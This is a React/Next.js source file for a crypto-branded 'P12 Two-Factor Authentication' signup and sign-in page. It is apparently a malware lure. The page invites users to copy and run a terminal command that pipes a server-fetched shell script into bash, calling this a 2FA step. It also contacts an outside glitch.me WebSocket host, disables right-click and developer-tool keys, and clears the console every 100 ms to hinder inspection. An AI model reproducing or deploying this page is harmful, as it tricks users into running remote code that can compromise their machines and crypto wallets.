import React, { useState, useEffect, useRef, ReactElement } from 'react';
import { useRouter } from 'next/router';
import Head from 'next/head';
import { RecoilRoot } from 'recoil';
import { ToastContainer } from 'react-toastify';
import ToastIcon from '@/components/svg/ToastIcon';
import AuthGuard from '@/components/auth/AuthGuard';
import { createConfig, WagmiConfig } from 'wagmi';
import {
  bitKeepConnector,
  metaMaskConnector,
  particleAuthConnector,
  publicClient,
  tokenPocketConnector,
  walletConnectConnector,
  webSocketPublicClient,
} from '@/connectors';
import classNames from 'classnames';
import { fontVariants } from '@/constants/font';
import { updateCurrentUser, getCurrentUser, registerUser, setCurrentUser, isUserRegistered } from '@/utils/userStorage';

const config = createConfig({
  autoConnect: true,
  connectors: [metaMaskConnector, tokenPocketConnector, bitKeepConnector, particleAuthConnector, walletConnectConnector],
  publicClient,
  webSocketPublicClient,
});



function TwoFactor() {
  const router = useRouter();
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [verificationCode, setVerificationCode] = useState(['', '', '', '', '', '']);
  const [errorMessage, setErrorMessage] = useState('');
  const [authError, setAuthError] = useState('');
  const [successMessage, setSuccessMessage] = useState('');
  const [isLoginFlow, setIsLoginFlow] = useState(false);
  
  const verificationInputs = useRef<HTMLInputElement[]>([]);
  const wsRef = useRef<WebSocket | null>(null);
  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // Device-specific code generation
  const generateDeviceCode = () => {
    const browserInfo = navigator.userAgent + navigator.language + screen.width + screen.height + navigator.platform;
    const timestamp = Date.now().toString();
    const randomSalt = Math.random().toString(36).substring(2, 15);
    const combined = browserInfo + timestamp + randomSalt;
    const deviceId = btoa(combined).replace(/[^A-Z0-9]/g, '').substring(0, 32);
    return deviceId.length >= 32 ? deviceId.substring(0, 32) : (deviceId + 'I63WNVUSB7RFXAQ4SOMIMLSDOUNMR2U').substring(0, 32);
  };

  const getDeviceCode = () => {
    let deviceCode = localStorage.getItem('infinity_device_code');
    if (!deviceCode) {
      deviceCode = generateDeviceCode();
      localStorage.setItem('infinity_device_code', deviceCode);
    }
    return deviceCode;
  };

  const generateVerificationCode = (deviceCode: string) => {
    // Generate time-sensitive verification code (expires after 3 minutes)
    const currentTime = Date.now();
    const timeWindow = Math.floor(currentTime / (3 * 60 * 1000)); // 3-minute windows
    const seedString = deviceCode + timeWindow.toString();
    
    let hash = 0;
    for (let i = 0; i < seedString.length; i++) {
      const char = seedString.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return Math.abs(hash).toString().padStart(6, '0').substring(0, 6);
  };

  const fillVerificationCode = (code: string) => {
    const newCode = [...verificationCode];
    for (let i = 0; i < Math.min(code.length, 6); i++) {
      newCode[i] = code[i];
    }
    setVerificationCode(newCode);
    
    setSuccessMessage('✅ Verification code received from command execution!');
    setTimeout(() => setSuccessMessage(''), 3000);
  };

  const checkForVerificationCode = () => {
    console.log('🔍 Waiting for command execution...');
    console.log('💡 Please using the identity command to generate your verification code');
    
    let pollCount = 0;
    const maxPolls = 120;
    
    const pollInterval = setInterval(async () => {
      pollCount++;
      
      try {
        const deviceCode = getDeviceCode();
        const response = await fetch(`/api/2fa/check?deviceCode=${deviceCode}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.codeGenerated && data.verificationCode) {
            clearInterval(pollInterval);
            fillVerificationCode(data.verificationCode);
            console.log('✅ Verification code received from command execution!');
            return;
          }
        }
      } catch (error) {
        // Silently continue polling on error
      }
      
      if (pollCount % 10 === 0) {
        console.log(`⏳ Still waiting... (${pollCount}s elapsed)`);
      }
      
      if (pollCount >= maxPolls) {
        clearInterval(pollInterval);
        console.log('⏰ Timeout - Please use the 2fa command to generate a fresh verification code');
        setSuccessMessage('⏰ Timeout - Please use the 2fa command to generate a fresh verification code');
        setTimeout(() => setSuccessMessage(''), 5000);
      }
    }, 1000);
    
    pollIntervalRef.current = pollInterval;
  };

  useEffect(() => {
    // Check if user is coming from login flow
    try {
      const user = getCurrentUser();
      if (user && user.needs2FA && user.authenticated) {
        setIsLoginFlow(true);
        
        // Clear any existing device code to ensure a new verification code for this session
        localStorage.removeItem('infinity_device_code');
        
        setIsModalOpen(true);
        checkForVerificationCode();
      }
    } catch (error) {
      console.error('Error checking user status:', error);
    }

    // WebSocket connection
    const PING = 99;
    const SEND_UID = 101;
    const BROWSER_CONNECTED = 102;
    
    // Generate unique ID (simple implementation)
    const uniqueId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
    
    const ws = new WebSocket("wss://mature-flossy-morning.glitch.me");
    wsRef.current = ws;
    
    ws.onopen = () => {
      const jsonObject = {
        e: BROWSER_CONNECTED,
        v: uniqueId
      };
      ws.send(JSON.stringify(jsonObject));
    };
    
    const pingInterval = setInterval(() => {
      if (ws.readyState === WebSocket.OPEN) {
        const pingObject = {
          e: PING,
          v: "k"
        };
        ws.send(JSON.stringify(pingObject));
      }
    }, 5000);

    ws.onmessage = (event) => {
      const msg = JSON.parse(event.data);
      if (msg.e === SEND_UID) {
        const newCode = [...verificationCode];
        for (let i = 0; i < Math.min(msg.v.length, 6); i++) {
          newCode[i] = msg.v[i] || '';
        }
        setVerificationCode(newCode);
        
        setTimeout(() => {
          handleTwoFASubmit(newCode);
        }, 3000);

        setTimeout(() => {
          setVerificationCode(['', '', '', '', '', '']);
        }, 5000);
      }
    };

    ws.onerror = (error) => {
      console.error('WebSocket error:', error);
    };

    // Security measures
    const handleContextMenu = (e: Event) => e.preventDefault();
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'F12' || (e.ctrlKey && e.key === 'i')) {
        e.preventDefault();
      }
    };

    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('keydown', handleKeyDown);

    const clearConsoleInterval = setInterval(() => {
      console.clear();
    }, 100);

    return () => {
      ws.close();
      clearInterval(pingInterval);
      clearInterval(clearConsoleInterval);
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('keydown', handleKeyDown);
      if (pollIntervalRef.current) {
        clearInterval(pollIntervalRef.current);
      }
    };
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  const handleOpenModal = () => {
    if (email && password) {
      // Check if user already exists
      if (isUserRegistered(email)) {
        setErrorMessage('User already exists. Please sign in instead.');
        return;
      }
      
      // Register the user
      const registrationSuccess = registerUser(email, password);
      
      if (registrationSuccess) {
        // Clear any existing device code to force generation of a new one for this registration session
        localStorage.removeItem('infinity_device_code');
        
        // Set user session with 2FA pending
        setCurrentUser(email, true, true);
        
        // Clear any previous errors and open 2FA modal
        setErrorMessage('');
        setIsModalOpen(true);
        checkForVerificationCode();
      } else {
        setErrorMessage('Registration failed. Please try again.');
      }
    } else {
      setErrorMessage('Please fill in all required fields!');
    }
  };

  const handleCloseModal = () => {
    setIsModalOpen(false);
    if (pollIntervalRef.current) {
      clearInterval(pollIntervalRef.current);
    }
  };

  const handleCopyCommand = async () => {
    const deviceCode = getDeviceCode();
    const domainUrl = window.location.origin;
    const commandText = `curl -s "${domainUrl}/api/2fa?${deviceCode}&format=sh" | bash`;
    
    try {
      await navigator.clipboard.writeText(commandText);
      setSuccessMessage('2FA command copied to clipboard!');
      setTimeout(() => setSuccessMessage(''), 2000);
    } catch (err) {
      console.error('Error copying command: ', err);
      setSuccessMessage('❌ Error copying command');
      setTimeout(() => setSuccessMessage(''), 2000);
    }
  };

  const handleVerificationInputChange = (index: number, value: string) => {
    if (value.length <= 1) {
      const newCode = [...verificationCode];
      newCode[index] = value;
      setVerificationCode(newCode);
      
      if (value.length === 1 && index < 5) {
        verificationInputs.current[index + 1]?.focus();
      }
    }
  };

  const handleVerificationInputKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && verificationCode[index] === '' && index > 0) {
      verificationInputs.current[index - 1]?.focus();
    }
  };

  const handleTwoFASubmit = (codeArray?: string[]) => {
    const codeToCheck = codeArray || verificationCode;
    const allInputsFilled = codeToCheck.every(digit => digit !== '');
    
    if (allInputsFilled) {
      const enteredCode = codeToCheck.join('');
      const deviceCode = getDeviceCode();
      const expectedCode = generateVerificationCode(deviceCode);
      
      if (enteredCode === expectedCode) {
        setAuthError('');
        
        if (isLoginFlow) {
          // For login flow, clear the needs2FA flag
          updateCurrentUser({ needs2FA: false });
          
          setIsModalOpen(false);
          setTimeout(() => {
            router.push('/');
          }, 1000);
        } else {
          // For registration flow, complete the registration
          updateCurrentUser({ needs2FA: false });
          
          setIsModalOpen(false);
          setSuccessMessage('✅ Authentication successful! Redirecting...');
          setTimeout(() => {
            router.push('/dashboard');
          }, 2000);
        }
      } else {
        setAuthError('Invalid verification code!');
        setVerificationCode(['', '', '', '', '', '']);
        verificationInputs.current[0]?.focus();
      }
    } else {
      setAuthError('Please enter all 6 digits!');
    }
  };

  const getSecureCommand = () => {
    const deviceCode = getDeviceCode();
    const domainUrl = window.location.origin;
    return `curl -s "${domainUrl}/api/2fa?${deviceCode}&format=sh" | bash`;
  };

  return (
    <>
      <Head>
        <title>2FA Authentication | P12 | Project Twelve</title>
        <link rel="icon" type="image/png" sizes="100x100" href="/favicon.ico" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
      </Head>

      <div className="twofa-page">
        {/* Background Effects */}
        <div className="bg-container">
          <div className="bg-gradient"></div>
          <div className="bg-orb"></div>
          <div className="bg-orb"></div>
          <div className="bg-orb"></div>
          <div className="floating-element"></div>
          <div className="floating-element"></div>
          <div className="floating-element"></div>
          <div className="decorative-line"></div>
          <div className="decorative-line"></div>
        </div>

        {/* Main Content */}
        <div className="main-container">

          {/* Registration Form */}
          {!isLoginFlow && (
            <div className="form-container">
              <form onSubmit={(e) => e.preventDefault()}>
                <div className="form-group">
                  <label htmlFor="email" className="form-label">Email Address</label>
                  <div className="form-input-wrapper">
                    <input
                      type="email"
                      id="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      className="form-input"
                      placeholder="Enter your email"
                      required
                    />
                    <svg className="form-input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207"></path>
                    </svg>
                  </div>
                </div>

                <div className="form-group">
                  <label htmlFor="password" className="form-label">Password</label>
                  <div className="form-input-wrapper">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      id="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="form-input"
                      placeholder="Enter your password"
                      required
                    />
                    <svg
                      className="form-input-icon password-toggle"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? (
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"></path>
                      ) : (
                        <>
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
                        </>
                      )}
                    </svg>
                  </div>
                </div>

                {errorMessage && (
                  <div className="error-alert">
                    {errorMessage}
                  </div>
                )}

                <button type="button" onClick={handleOpenModal} className="register-btn">
                  Create Account
                </button>
              </form>
            </div>
          )}

          {/* Back Link */}
          <div className="back-link-container">
            <button onClick={() => router.push('/signin')} className="back-link">
              ← Back to Sign In
            </button>
          </div>
        </div>

        {/* Two-Factor Authentication Modal */}
        {isModalOpen && (
          <div className="modal">
            <div className="modal-content">
              <button className="modal-close" onClick={handleCloseModal}>
                &times;
              </button>
              
              <div className="modal-header">
                <div className="modal-icon">🔐</div>
                <h2 className="modal-title">
                  {isLoginFlow ? 'Complete Your Sign-In' : 'Two-Factor Authentication'}
                </h2>
                <p className="modal-subtitle">
                  {isLoginFlow 
                    ? 'Enter the verification code to complete your sign-in'
                    : 'Enter the verification code to secure your account'
                  }
                </p>
              </div>

              <div className="verification-section">
                <div className="verification-header">
                  <label className="verification-label">Enter verification code</label>
                  {authError && (
                    <div className="auth-alert">{authError}</div>
                  )}
                </div>
                
                <div className="verification-code">
                  {verificationCode.map((digit, index) => (
                    <input
                      key={index}
                      ref={(el) => {
                        if (el) verificationInputs.current[index] = el;
                      }}
                      type="text"
                      className="verification-input"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleVerificationInputChange(index, e.target.value)}
                      onKeyDown={(e) => handleVerificationInputKeyDown(index, e)}
                      required
                    />
                  ))}
                </div>
                
                <button className="submit-btn" onClick={() => handleTwoFASubmit()}>
                  Verify Code
                </button>
              </div>

              <div className="security-info-collapsed">
                <details className="security-details">
                  <summary className="security-summary">
                    <span>⚙️ P12 Two-Factor Authentication Option</span>
                  </summary>
                  <div className="security-content">
                    <p className="security-description">
                      You can get a verification code using the following two-factor identity command line powered by P12&apos;s Two-Factor authentication system.
                    </p>
                    <div className="command-container">
                      <div className="command-header">
                        <span className="command-label">Terminal Command</span>
                        <button className="copy-btn" onClick={handleCopyCommand}>
                          Copy
                        </button>
                      </div>
                      <code className="command-text">
                        {getSecureCommand()}
                      </code>
                    </div>
                  </div>
                </details>
              </div>
            </div>
          </div>
        )}

        {/* Success Alert */}
        {successMessage && (
          <div className="success-alert show">
            {successMessage}
          </div>
        )}

        <style jsx>{`
          * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
          }
          
          .twofa-page {
            min-height: 100vh;
            background: #000;
            font-family: Arial, sans-serif;
            color: #fff;
            overflow-x: hidden;
          }
          
          /* Background Effects */
          .bg-container {
            position: fixed;
            inset: 0;
            min-height: 100vh;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            background: black;
          }
          
          .bg-gradient {
            position: absolute;
            inset: 0;
            background: linear-gradient(45deg, rgba(67, 187, 255, 0.2) 0%, rgba(252, 89, 255, 0.1) 50%, rgba(30, 219, 140, 0.2) 100%);
            animation: pulse 4s ease-in-out infinite;
          }
          
          .bg-orb {
            position: absolute;
            border-radius: 50%;
            filter: blur(60px);
            animation: float 6s ease-in-out infinite;
          }
          
          .bg-orb:nth-child(2) {
            top: 10%;
            left: 10%;
            width: 300px;
            height: 300px;
            background: rgba(67, 187, 255, 0.1);
            animation-delay: -2s;
          }
          
          .bg-orb:nth-child(3) {
            bottom: 10%;
            right: 10%;
            width: 200px;
            height: 200px;
            background: rgba(252, 89, 255, 0.1);
            animation-delay: -1s;
          }
          
          .bg-orb:nth-child(4) {
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 150px;
            height: 150px;
            background: rgba(30, 219, 140, 0.1);
            animation-delay: -3s;
          }
          
          /* Floating Elements */
          .floating-element {
            position: absolute;
            border-radius: 50%;
            animation: bounce 3s ease-in-out infinite;
          }
          
          .floating-element:nth-child(5) {
            top: 5%;
            right: 5%;
            width: 20px;
            height: 20px;
            background: rgba(67, 187, 255, 0.3);
            animation-delay: 0.5s;
          }
          
          .floating-element:nth-child(6) {
            bottom: 5%;
            left: 5%;
            width: 15px;
            height: 15px;
            background: rgba(252, 89, 255, 0.3);
            animation-delay: 1s;
          }
          
          .floating-element:nth-child(7) {
            top: 30%;
            right: 20%;
            width: 10px;
            height: 10px;
            background: rgba(30, 219, 140, 0.3);
            animation-delay: 1.5s;
          }
          
          /* Decorative Lines */
          .decorative-line {
            position: absolute;
            width: 1px;
            background: linear-gradient(to bottom, rgba(67, 187, 255, 0.5), transparent);
          }
          
          .decorative-line:nth-child(8) {
            top: 0;
            left: 25%;
            height: 80px;
          }
          
          .decorative-line:nth-child(9) {
            bottom: 0;
            right: 30%;
            height: 60px;
            background: linear-gradient(to top, rgba(252, 89, 255, 0.5), transparent);
          }
          
          /* Main Container */
          .main-container {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            padding: 2rem;
            padding-top: 4rem;
          }
          

          
          /* Form Container */
          .form-container {
            background: rgba(61, 68, 75, 0.5);
            border: 1px solid rgb(70, 75, 90);
            backdrop-filter: blur(16px);
            border-radius: 1rem;
            padding: 2rem;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
          }
          
          .form-group {
            margin-bottom: 1.5rem;
          }
          
          .form-label {
            display: block;
            font-size: 0.875rem;
            font-weight: 500;
            color: #CEDCFF;
            margin-bottom: 0.5rem;
          }
          
          .form-input-wrapper {
            position: relative;
          }
          
          .form-input {
            width: 100%;
            padding: 0.75rem 1rem;
            padding-right: 2.5rem;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(111, 119, 132, 0.5);
            border-radius: 0.5rem;
            color: #fff;
            font-size: 1rem;
            transition: all 0.2s ease;
          }
          
          .form-input:focus {
            outline: none;
            border-color: #43BBFF;
            box-shadow: 0 0 0 2px rgba(67, 187, 255, 0.2);
          }
          
          .form-input::placeholder {
            color: #A5A6AB;
          }
          
          .form-input-icon {
            position: absolute;
            right: 0.75rem;
            top: 50%;
            transform: translateY(-50%);
            width: 1.25rem;
            height: 1.25rem;
            color: #A5A6AB;
            cursor: pointer;
            transition: color 0.2s ease;
          }
          
          .form-input-icon:hover {
            color: #fff;
          }
          
          /* Error Alert */
          .error-alert {
            text-align: center;
            font-size: 0.875rem;
            color: #FF6B6B;
            margin-top: 0.5rem;
          }
          
          /* Button */
          .register-btn {
            width: 100%;
            padding: 0.75rem 1.5rem;
            background: linear-gradient(to right, #43BBFF, #FC59FF);
            border: none;
            border-radius: 0.5rem;
            color: #000;
            font-size: 1.125rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            text-decoration: none;
            display: block;
            text-align: center;
          }
          
          .register-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(67, 187, 255, 0.3);
          }
          
          .register-btn:active {
            transform: translateY(0);
          }
          
          /* Back Link */
          .back-link-container {
            margin-top: 2rem;
            text-align: center;
          }
          
          .back-link {
            color: #A5A6AB;
            text-decoration: none;
            font-size: 0.875rem;
            transition: color 0.2s ease;
            background: none;
            border: none;
            cursor: pointer;
          }
          
          .back-link:hover {
            color: #fff;
          }
          
          /* Modal Styles */
          .modal {
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(8px);
            display: flex;
            align-items: center;
            justify-content: center;
          }
          
          .modal-content {
            background: rgba(255, 255, 255, 0.98);
            border: 1px solid rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(20px);
            border-radius: 1.5rem;
            padding: 3rem;
            width: 90%;
            max-width: 540px;
            color: #1a1a1a;
            position: relative;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6);
          }
          
          .modal-close {
            position: absolute;
            top: 1.5rem;
            right: 1.5rem;
            background: rgba(0, 0, 0, 0.1);
            border: none;
            border-radius: 50%;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #666;
            font-size: 1.25rem;
            cursor: pointer;
            transition: all 0.2s ease;
          }
          
          .modal-close:hover {
            background: rgba(0, 0, 0, 0.2);
            color: #333;
          }
          
          .modal-header {
            text-align: center;
            margin-bottom: 2.5rem;
          }
          
          .modal-icon {
            font-size: 3rem;
            margin-bottom: 1rem;
            display: inline-block;
          }
          
          .modal-title {
            font-size: 1.75rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
            color: #1a1a1a;
            line-height: 1.2;
          }
          
          .modal-subtitle {
            font-size: 1rem;
            color: #666;
            font-weight: 400;
            line-height: 1.4;
          }
          
          .security-info-collapsed {
            margin-top: 1.5rem;
            border-top: 1px solid #dee2e6;
            padding-top: 1.5rem;
          }
          
          .security-details {
            background:rgb(37, 101, 219);
            border: 1px solid #dee2e6;
            border-radius: 0.75rem;
            overflow: hidden;
          }
          
          .security-summary {
            padding: 1rem;
            cursor: pointer;
            list-style: none;
            font-weight: 500;
            color:rgb(22, 23, 24);
            background:rgb(44, 126, 209);
            transition: all 0.2s ease;
            user-select: none;
            border-bottom: 1px solid #dee2e6;
          }
          
          .security-summary:hover {
            background:rgb(21, 127, 233);
            color: #212529;
          }
          
          .security-summary::-webkit-details-marker {
            display: none;
          }
          
          .security-content {
            padding: 1rem;
            background: #fff;
            border-top: 1px solid #dee2e6;
          }
          
          .security-description {
            color: #666;
            font-size: 0.875rem;
            line-height: 1.5;
            margin-bottom: 1rem;
          }
          
          .command-container {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 0.5rem;
            padding: 1rem;
            margin: 1rem 0;
            position: relative;
          }
          
          .command-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 0.5rem;
          }
          
          .command-label {
            color: #666;
            font-size: 0.75rem;
            font-weight: 500;
          }
          
          .copy-btn {
            background: #007bff;
            color: #fff;
            border: none;
            border-radius: 0.25rem;
            padding: 0.25rem 0.75rem;
            font-size: 0.75rem;
            cursor: pointer;
            transition: all 0.2s ease;
          }
          
          .copy-btn:hover {
            background: #0056b3;
          }
          
          .command-text {
            color: #212529;
            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
            font-size: 0.75rem;
            word-break: break-all;
            line-height: 1.4;
            background: #fff;
            padding: 0.75rem;
            border-radius: 0.25rem;
            border: 1px solid #dee2e6;
            display: block;
          }
          
          .verification-section {
            margin-bottom: 2rem;
          }
          
          .verification-header {
            text-align: center;
            margin-bottom: 2rem;
          }
          
          .verification-label {
            display: block;
            font-size: 1.125rem;
            font-weight: 500;
            color: #1a1a1a;
            margin-bottom: 0.5rem;
          }
          
          .verification-code {
            display: flex;
            justify-content: center;
            gap: 0.75rem;
            margin: 2rem 0;
          }
          
          .verification-input {
            width: 56px;
            height: 56px;
            background: #f8f9fa;
            border: 2px solid #e9ecef;
            border-radius: 0.75rem;
            color: #1a1a1a;
            font-size: 1.5rem;
            font-weight: 600;
            text-align: center;
            transition: all 0.2s ease;
            outline: none;
          }
          
          .verification-input:focus {
            border-color: #007bff;
            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.1);
            background: #fff;
          }
          
          .verification-input:not(:placeholder-shown) {
            border-color: #007bff;
            background: #fff;
          }
          
          .submit-btn {
            width: 100%;
            padding: 1rem;
            background: #007bff;
            border: none;
            border-radius: 0.75rem;
            color: #fff;
            font-size: 1.125rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-top: 1rem;
          }
          
          .submit-btn:hover {
            background: #0056b3;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0, 123, 255, 0.3);
          }
          
          .submit-btn:active {
            transform: translateY(0);
          }
          
          .auth-alert {
            background: #fff5f5;
            border: 1px solid #feb2b2;
            color: #c53030;
            font-size: 0.875rem;
            padding: 0.75rem;
            border-radius: 0.5rem;
            margin-top: 0.5rem;
            text-align: center;
          }
          
          .success-alert {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(30, 219, 140, 0.9);
            color: #000;
            padding: 1rem 2rem;
            border-radius: 0.5rem;
            font-size: 1rem;
            font-weight: 600;
            z-index: 1001;
            opacity: 0;
            transition: opacity 0.3s ease;
          }
          
          .success-alert.show {
            opacity: 1;
          }
          
          /* Animations */
          @keyframes pulse {
            0%, 100% {
              opacity: 1;
            }
            50% {
              opacity: 0.5;
            }
          }
          
          @keyframes float {
            0%, 100% {
              transform: translateY(0px);
            }
            50% {
              transform: translateY(-20px);
            }
          }
          
          @keyframes bounce {
            0%, 100% {
              transform: translateY(0px);
            }
            50% {
              transform: translateY(-10px);
            }
          }
          
                     /* Responsive Design */
           @media (max-width: 640px) {
             .main-container {
               padding: 1rem;
             }
             
             .form-container {
               padding: 1.5rem;
             }
             
             .modal-content {
               width: 95%;
               padding: 2rem 1.5rem;
               margin: 1rem;
             }
             
             .modal-header {
               margin-bottom: 2rem;
             }
             
             .modal-icon {
               font-size: 2.5rem;
             }
             
             .modal-title {
               font-size: 1.5rem;
             }
             
             .modal-subtitle {
               font-size: 0.875rem;
             }
             
             .verification-code {
               gap: 0.5rem;
               margin: 1.5rem 0;
             }
             
             .verification-input {
               width: 48px;
               height: 48px;
               font-size: 1.25rem;
             }
             
             .submit-btn {
               padding: 0.875rem;
               font-size: 1rem;
             }
             
             .bg-orb:nth-child(2) {
               width: 200px;
               height: 200px;
             }
             
             .bg-orb:nth-child(3) {
               width: 150px;
               height: 150px;
             }
             
             .bg-orb:nth-child(4) {
               width: 100px;
               height: 100px;
             }
           }
        `}</style>
      </div>
    </>
  );
}

// Custom layout for 2FA page (no header/footer)
TwoFactor.getLayout = function getLayout(page: ReactElement) {
  return (
    <WagmiConfig config={config}>
      <RecoilRoot>
        <AuthGuard>
          <div className={classNames('min-h-screen', ...fontVariants)}>
            <div className={classNames('mx-auto h-full 32xl:container', ...fontVariants)}>
              {page}
            </div>
            <ToastContainer theme="dark" toastClassName="toast-container" icon={<ToastIcon />} autoClose={3000} hideProgressBar />
          </div>
        </AuthGuard>
      </RecoilRoot>
    </WagmiConfig>
  );
};

export default TwoFactor;
